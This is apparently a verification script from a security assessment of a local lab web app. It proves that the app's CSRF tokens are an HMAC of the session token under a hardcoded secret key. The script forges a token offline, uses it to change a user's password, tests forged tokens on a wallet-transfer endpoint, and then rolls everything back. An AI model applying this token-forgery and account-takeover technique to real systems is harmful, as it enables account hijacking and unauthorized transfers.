# -*- coding: utf-8 -*-
"""t5 核验 step6：CSRF token 与 HMAC(SECRET_KEY, session_token) 的等价性直接证明
（step2 只抓了响应体前 1500 字节，表单在页面下方 → 本轮抓全）。
"""
import sys, os, time, re, hmac, hashlib, json, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_lib_import import *  # noqa
import verify_lib as V
import http.client

out = {"step": "step6-csrf-hmac-proof", "started": time.strftime("%Y-%m-%dT%H:%M:%S%z")}
V.req("GET", "/__reset"); time.sleep(0.25)
out["baseline_sha"] = V.db_snapshot("s6 base")["sha256"]
tok_a, _ = V.login("alice", "alice123")
tok_d, _ = V.login("demo", "demo123")

def full_get(path, tok):
    c = http.client.HTTPConnection("127.0.0.1", 8095, timeout=15)
    c.request("GET", path, headers={"Cookie": f"token={tok}"})
    r = c.getresponse()
    body = r.read().decode("utf-8", "replace")
    st = r.status
    c.close()
    return st, body

st_home, home_body = full_get("/home", tok_a)
csrf_home = re.findall(r'name="csrf_token" value="([0-9a-f]{64})"', home_body)
calc_a = hmac.new(b"lab-secret-key-PLEASE-CHANGE-001", tok_a.encode(), hashlib.sha256).hexdigest()
st_cp, cp_body = full_get("/change-password", tok_a)
csrf_cp = re.findall(r'name="csrf_token" value="([0-9a-f]{64})"', cp_body)

out["hmac_proof"] = {
    "session_token_alice": tok_a,
    "csrf_tokens_in_home_form": csrf_home,
    "csrf_token_in_change_password_form": csrf_cp,
    "hmac_calc_alice": calc_a,
    "match_home": calc_a in csrf_home,
    "match_change_password": calc_a in csrf_cp,
    "home_status": st_home, "cp_status": st_cp,
    "home_body_len": len(home_body),
}

# 用离线计算的 token 改 alice 口令 → 登录验证（危害证明 + 明确回滚）
newpw = "verifierT5pw!"
cp = V.req("POST", "/change-password",
           headers={**V.cookie(tok_a), "Content-Type": "application/x-www-form-urlencoded"},
           body=urllib.parse.urlencode({"csrf_token": calc_a, "new_password": newpw}))
b_old = V.login("alice", "alice123")
b_new = V.login("alice", newpw)
out["offline_token_abuse"] = {
    "change_password_with_offline_token": [cp["status"], "密码已修改" in cp["body_head"]],
    "login_with_old_password": b_old[1]["status"],
    "login_with_new_password": b_new[1]["status"],
    "raw_change_password": cp,
}
# 回滚：改回原口令（同通道），随后 /__reset 兜底
back = V.req("POST", "/change-password",
             headers={**V.cookie(b_new[0] or tok_a), "Content-Type": "application/x-www-form-urlencoded"},
             body=urllib.parse.urlencode({"csrf_token": hmac.new(
                 b"lab-secret-key-PLEASE-CHANGE-001", (b_new[0] or tok_a).encode(),
                 hashlib.sha256).hexdigest(), "new_password": "alice123"}))
check = V.login("alice", "alice123")
out["rollback_change_password"] = {"status": back["status"], "relogin_old_pw": check[1]["status"],
                                   "token_present": bool(check[0])}

# 同一 token 在 demo 会话上是否有效（证明 token 绑定 token，不与用户绑定）
calc_d = hmac.new(b"lab-secret-key-PLEASE-CHANGE-001", tok_d.encode(), hashlib.sha256).hexdigest()
cross = V.req("POST", "/wallet/transfer",
              headers={**V.cookie(tok_d), "Content-Type": "application/x-www-form-urlencoded"},
              body=urllib.parse.urlencode({"csrf_token": calc_a, "to": "alice", "amount": 100}))
own = V.req("POST", "/wallet/transfer",
            headers={**V.cookie(tok_d), "Content-Type": "application/x-www-form-urlencoded"},
            body=urllib.parse.urlencode({"csrf_token": calc_d, "to": "alice", "amount": 100}))
out["token_binding"] = {
    "alice_token_on_demo_session": [cross["status"], "请求被拒绝" in cross["body_head"]],
    "demo_token_on_demo_session": own["status"],
    "raw": [cross, own],
}

V.req("GET", "/__reset"); time.sleep(0.25)
clean = V.db_snapshot("s6 clean")
out["rollback_final"] = {"sha": clean["sha256"], "back_to_baseline": clean["sha256"] == out["baseline_sha"],
                         "integrity": V.db_scalar("PRAGMA integrity_check"), "counts": clean["counts"]}
out["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
V.save("verify-06-csrf-hmac-proof-20261012-1855.json", out)
print(json.dumps({k: v for k, v in out.items() if "raw" not in k and k != "rollback_final"}, ensure_ascii=False, indent=1)[:1800])
print("rollback:", out["rollback_final"])
